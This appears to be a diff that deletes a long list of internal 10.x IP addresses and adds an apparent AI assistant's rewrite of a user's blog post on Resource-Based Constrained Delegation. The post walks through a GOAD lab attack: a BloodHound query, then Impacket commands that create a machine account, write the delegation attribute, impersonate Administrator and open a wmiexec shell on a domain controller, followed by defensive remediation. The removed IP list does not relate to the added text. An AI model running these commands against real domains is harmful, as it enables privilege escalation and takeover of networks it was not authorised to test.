@@ -1,270 +1,169 @@
-10.10.4.65
-10.10.4.66
-10.10.4.253
-10.10.5.154
-10.10.67.79
-10.10.79.27
-10.10.102.125
-10.10.214.201
-10.10.231.2
-10.17.11.49
-10.17.19.191
-10.17.21.125
-10.17.42.168
-10.17.43.50
-10.17.48.151
-10.17.64.127
-10.17.70.217
-10.17.72.190
-10.17.95.159
-10.17.107.124
-10.17.108.96
-10.17.119.138
-10.17.138.171
-10.17.141.31
-10.17.156.52
-10.17.159.96
-10.17.214.199
-10.17.246.14
-10.18.17.109
-10.18.148.115
-10.18.175.196
-10.18.192.72
-10.18.206.166
-10.18.211.210
-10.18.223.58
-10.18.225.10
-10.18.225.22
-10.18.231.244
-10.18.236.21
-10.18.238.82
-10.18.243.111
-10.18.248.30
-10.18.249.225
-10.18.254.173
-10.18.255.140
-10.10.175.108
-10.17.3.88
-10.17.5.46
-10.17.7.189
-10.17.8.120
-10.17.20.148
-10.17.29.73
-10.17.29.157
-10.17.32.41
-10.17.34.6
-10.17.35.70
-10.17.37.61
-10.17.38.124
-10.17.38.255
-10.17.40.235
-10.17.41.178
-10.17.41.184
-10.17.43.160
-10.17.44.207
-10.17.44.210
-10.17.45.121
-10.17.52.181
-10.17.53.255
-10.17.55.208
-10.17.57.156
-10.17.59.117
-10.17.60.213
-10.17.61.223
-10.17.61.226
-10.17.66.84
-10.17.67.114
-10.17.68.63
-10.17.68.116
-10.17.70.139
-10.17.70.174
-10.17.71.52
-10.17.73.144
-10.17.76.174
-10.17.78.159
-10.17.80.5
-10.17.80.157
-10.17.81.44
-10.17.81.117
-10.17.84.209
-10.17.85.86
-10.17.85.196
-10.17.93.119
-10.17.93.142
-10.17.95.42
-10.17.95.107
-10.17.96.198
-10.17.96.253
-10.17.98.107
-10.17.99.118
-10.17.99.169
-10.17.99.170
-10.17.99.245
-10.17.100.84
-10.17.102.23
-10.17.102.29
-10.17.104.47
-10.17.104.233
-10.17.115.4
-10.17.117.84
-10.17.119.103
-10.10.1.254
-10.10.4.67
-10.10.4.71
-10.10.4.75
-10.10.4.77
-10.10.4.80
-10.10.4.82
-10.10.4.83
-10.10.4.86
-10.10.4.87
-10.10.4.88
-10.10.4.91
-10.10.4.92
-10.10.4.93
-10.10.4.95
-10.10.4.96
-10.10.4.97
-10.10.4.101
-10.10.4.103
-10.10.4.108
-10.10.4.109
-10.10.4.111
-10.10.4.116
-10.10.4.118
-10.10.4.244
-10.10.4.245
-10.10.4.251
-10.10.4.252
-10.10.4.254
-10.10.5.1
-10.10.5.4
-10.10.5.6
-10.10.5.13
-10.10.5.158
-10.10.5.165
-10.10.5.171
-10.10.5.178
-10.10.6.86
-10.10.6.92
-10.10.6.97
-10.10.6.171
-10.10.7.1
-10.10.7.14
-10.10.8.94
-10.10.10.117
-10.10.19.248
-10.10.30.171
-10.10.34.190
-10.10.38.130
-10.10.46.67
-10.10.54.141
-10.10.63.5
-10.10.65.22
-10.10.69.101
-10.10.75.41
-10.10.78.123
-10.10.81.139
-10.10.83.148
-10.10.83.216
-10.10.84.123
-10.10.86.182
-10.10.109.212
-10.10.111.48
-10.10.126.83
-10.10.126.178
-10.10.129.53
-10.10.134.191
-10.10.136.171
-10.10.140.147
-10.10.141.166
-10.10.181.134
-10.10.182.196
-10.10.186.81
-10.18.1.200
-10.18.6.172
-10.18.8.141
-10.18.9.162
-10.18.11.87
-10.18.12.31
-10.18.16.7
-10.18.19.231
-10.18.35.2
-10.18.38.75
-10.18.39.80
-10.18.41.177
-10.18.43.170
-10.18.47.130
-10.18.47.161
-10.18.48.21
-10.18.51.42
-10.18.52.26
-10.18.52.194
-10.18.55.75
-10.18.61.225
-10.18.64.247
-10.18.67.134
-10.18.73.90
-10.18.74.97
-10.18.75.208
-10.18.78.209
-10.18.78.233
-10.18.82.105
-10.18.82.120
-10.18.87.138
-10.18.92.175
-10.18.92.252
-10.18.94.112
-10.18.95.208
-10.18.97.232
-10.18.99.129
-10.18.100.77
-10.18.101.69
-10.18.107.22
-10.18.109.227
-10.18.114.237
-10.18.115.194
-10.18.115.202
-10.18.117.139
-10.18.118.182
-10.18.123.131
-10.18.127.81
-10.18.127.154
-10.18.129.10
-10.18.129.154
-10.18.130.161
-10.18.132.42
-10.18.133.177
-10.18.134.77
-10.18.135.198
-10.18.148.6
-10.18.148.155
-10.18.151.129
-10.18.158.78
-10.18.158.94
-10.18.161.48
-10.18.162.212
-10.18.165.132
-10.18.165.164
-10.18.166.120
-10.18.170.249
-10.18.172.166
-10.18.172.237
-10.18.174.133
-10.18.176.243
-10.18.176.247
-10.18.177.187
-10.18.184.194
-10.18.188.226
-10.18.190.98
-10.18.190.151
-10.18.192.4
-10.18.193.206
-10.18.194.218
-10.18.195.144
-10.18.197.14
-10.18.197.16
-10.18.197.161
-10.18.199.114
-10.18.201.145
-10.18.201.239
+This is a great initiative. For a recruiter or a hiring manager in offensive security, your blog is a portfolio. They aren't just looking for "does he know the command?"; they are looking for **"can he explain complex concepts clearly to a client?"**
+
+Here is a revamped version of your post.
+
+**What I changed to make it "catchy":**
+
+1. **The "Executive Summary" Approach:** Recruiters often skim. I added a "Bottom Line Up Front" style introduction.
+2. **Consultant Mindset:** I shifted the wording from "how to hack" to "understanding the risk," which appeals to Big 4 and senior consultancy roles.
+3. **Visual Flow:** I reorganized the sections to follow a logical story: *The Concept -> The Discovery -> The Execution -> The Fix*.
+4. **Diagram Triggers:** I have added tags where you should insert diagrams to break up the text.
+
+### The Refined Markdown
+
+You can copy-paste this directly into your `.md` file.
+
+```markdown
+---
+layout: post
+title: "From GenericWrite to Domain Admin: Mastering Resource-Based Constrained Delegation (RBCD)"
+date: 2025-08-04 14:00:00 +0000
+categories: [active-directory, rbcd, privilege-escalation]
+tags: [red-team, kerberos, delegation, s4u, bloodhound]
+description: "A deep dive into exploiting Kerberos S4U extensions to escalate from a standard user to Domain Admin, and how to defend against it."
+image: /assets/img/rbcd-banner.jpg  # Optional: Add a banner image if your theme supports it
+---
+
+# Active Directory 101: Resource-Based Constrained Delegation (RBCD)
+
+**Complexity:** High | **Impact:** Critical | **Prevalence:** Common
+
+---
+
+## 🚀 The Elevator Pitch
+Resource-Based Constrained Delegation (RBCD) is one of the most elegant privilege escalation paths in Active Directory. Unlike traditional constrained delegation (which requires Domain Admin privileges to configure), RBCD can be configured by **anyone** with write permissions on a computer object.
+
+For a Red Teamer, this means if you find a `GenericWrite` or `WriteProperty` on a target computer, you can trick Active Directory into letting you impersonate **Administrator** on that machine.
+
+
+
+---
+
+## 🧠 The Concept: How S4U Works
+To understand the exploit, we must understand the feature. RBCD relies on the **Kerberos Service-for-User (S4U)** extensions, specifically designed to allow services to request tickets on behalf of users.
+
+<div class="key-concept" markdown="1">
+**The "AllowedToAct" Attribute**
+
+Unlike classic delegation (configured on the *front-end* service), RBCD is configured on the *target* resource using the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. 
+
+It effectively says: *"I trust <u>Computer A</u> to authenticate users on my behalf."*
+</div>
+
+The magic happens in two steps:
+1.  **S4U2Self:** The attacker's controlled computer asks the KDC: *"I need a ticket for Administrator to access myself."* The KDC obliges.
+2.  **S4U2Proxy:** The attacker's computer presents that ticket and asks: *"Administrator is trying to access the Target Resource through me. Can I get a ticket for them?"*
+3.  **Result:** The KDC issues a valid Service Ticket for Administrator to the Target.
+
+
+
+---
+
+## 🔍 The Discovery: BloodHound
+The hardest part of this attack isn't the execution; it's the discovery. We are looking for a specific Access Control Entry (ACE).
+
+**What to look for:**
+* **Edge:** `GenericAll`, `GenericWrite`, `WriteProperty`, or `WriteOwner`.
+* **Target:** A Computer Object (The victim server).
+* **Source:** Any user you have compromised.
+
+<div class="bloodhound-note" markdown="1">
+**BloodHound Query:**
+`MATCH p=(u:User)-[r:GenericWrite|GenericAll|WriteDacl|WriteOwner]->(c:Computer) RETURN p`
+</div>
+
+
+
+---
+
+## ⚔️ The Kill Chain (Lab Demo)
+
+Let's walk through a live exploitation on a **GOAD (Game of Active Directory)** lab environment.
+
+**The Scenario:**
+* **Compromised User:** `stannis.baratheon`
+* **Target Server:** `KINGSLANDING$` (Domain Controller)
+* **Vulnerability:** Stannis has `GenericWrite` on the `KINGSLANDING` object.
+
+### Step 1: Establish a Foothold (The Fake Service)
+We need a service account to perform S4U operations. Since we don't have one, we will create one. By default, any authenticated user can join up to 10 machines to the domain (`MachineAccountQuota`).
+
+```bash
+# Create a controlled machine account "EVILCOMPUTER"
+proxychains addcomputer.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
+    -method LDAPS \
+    -computer-name EVILCOMPUTER$ \
+    -computer-pass EvilPass123!
+
+# Result: EVILCOMPUTER$ created successfully
+
+```
+
+### Step 2: Weaponize the Delegation
+
+Now we use our write primitive. We will modify the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to trust our new computer.
+
+```bash
+# Configure KINGSLANDING to trust EVILCOMPUTER
+proxychains rbcd.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
+    -delegate-from EVILCOMPUTER$ \
+    -delegate-to KINGSLANDING$ \
+    -action write
+
+```
+
+### Step 3: The Protocol Abuse (S4U)
+
+We request the ticket. We ask the KDC to let us impersonate `Administrator` from our evil computer to the target.
+
+```bash
+# Execute S4U2Self + S4U2Proxy
+proxychains getST.py sevenkingdoms.local/EVILCOMPUTER$:EvilPass123! \
+    -spn cifs/kingslanding.sevenkingdoms.local \
+    -impersonate Administrator \
+    -dc-ip kingslanding.sevenkingdoms.local
+
+# Output: Administrator.ccache saved
+
+```
+
+### Step 4: Execution
+
+With the ticket in hand, we access the target.
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+
+# Pop a shell as SYSTEM
+proxychains wmiexec.py sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local \
+    -k -no-pass
+
+```
+
+<div class="success-box" markdown="1">
+**Pwned!** You have moved laterally from a standard user to Domain Admin on the DC.
+</div>
+
+---
+
+## 🛡️ Remediation & Defense
+
+As consultants, our job isn't just to break it, but to fix it. Here is how organizations can stop RBCD:
+
+1. **Set MachineAccountQuota to 0:** Prevent users from creating the dummy computers needed for the attack.
+2. **Audit DACLs:** Regularly scan for dangerous permissions (Write/GenericAll) on Computer objects using tools like BloodHound or PingCastle.
+3. **Tiered Administration:** Ensure standard users never have permissions over Tier 0 (Domain Controller) assets.
+
+---
+
+## 🧰 Toolkit
+
+* **Discovery:** [BloodHound](https://github.com/SpecterOps/BloodHound)
+* **Exploitation:** [Impacket (rbcd.py, getST.py)](https://github.com/fortra/impacket)
+* **Alternative:** [Rubeus (C#)](https://github.com/GhostPack/Rubeus)
+
+---
+
+*Disclaimer: This post is for educational purposes and cybersecurity research only. Always obtain written permission before testing on any network.*
+
+```
